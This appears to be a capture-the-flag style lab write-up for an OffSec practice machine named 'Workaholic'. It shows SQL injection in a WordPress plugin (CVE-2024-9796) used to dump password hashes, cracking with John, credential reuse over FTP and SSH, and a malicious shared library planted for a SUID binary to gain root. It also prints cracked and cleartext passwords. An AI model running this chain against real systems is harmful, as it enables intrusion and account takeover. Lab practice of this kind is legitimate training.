# Workaholic

## Enumeration

* nmap
```
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)

```

* wordpress site.

* wpscan reveals its vulnerable to sql injection.
```
[!] Title: WP-Advanced-Search < 3.3.9.2 - Unauthenticated SQL Injection
 |     Fixed in: 3.3.9.2
 |     References:
 |      - https://wpscan.com/vulnerability/2ddd6839-6bcb-4bb8-97e0-1516b8c2b99b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9796
 |
```
* https://wpscan.com/vulnerability/2ddd6839-6bcb-4bb8-97e0-1516b8c2b99b/

```
┌──(kali㉿kali)-[~/Desktop/Offsec/Lab-Notes/workaholic]
└─$ curl "http://192.168.138.229/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?q=admin&t=wp_users%20UNION%20SELECT%20user_pass%20FROM%20wp_users--&f=user_login&type=&e"
admin
charlie
ted
$P$BDJMoAKLzyLPtatN/WQrbPgHVMmNFn.
$P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p.
$P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/
```

* Crack the hashes
```
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt wp1.hash
```
- charlie:chrish20 
- ted:okadamat17

* ted creds worked for ftp login. found wp_config.

* wpadmin:rU)tJnTw5*ShDt4nOx

* mysql is not exposed. Reuse creds for ssh. works for charlie

## Priv Esc

* wp_monitor suid bit is set. The wp-monitor binary, when misconfigured with the SUID bit set and owned by root, attempts to dynamically load a specific shared object (library file) that does not exist in a standard location.

```
strings /var/www/html/wordpress/blog/wp-monitor
.
.
OST /wp-login.php
[Warning] Possible brute force attack detected: %s
[+] Checking the logs...
/home/ted/.lib/libsecurity.so
[!] This can take a while...
init_plugin
[!] Function not found in the library!
9*3$"
```

* wp-monitor runs as root (SUID) . It dlopen()s a shared library
* The library path is hardcoded to a user-writable location, It expects a function called init_plugin.

* Create a dir
```
mkdir -p /home/ted/.lib
cd /home/ted/.lib
```

* Create malicious shared library libsecurity.c
```
$ cat > /home/ted/.lib/libsecurity.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

void init_plugin() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
EOF> > > > > > > > > 
```

* compile
```
gcc -fPIC -shared -o /home/ted/.lib/libsecurity.so /home/ted/.lib/libsecurity.c
```

* Run suid
```
/var/www/html/wordpress/blog/wp-monitor
```

* Get root
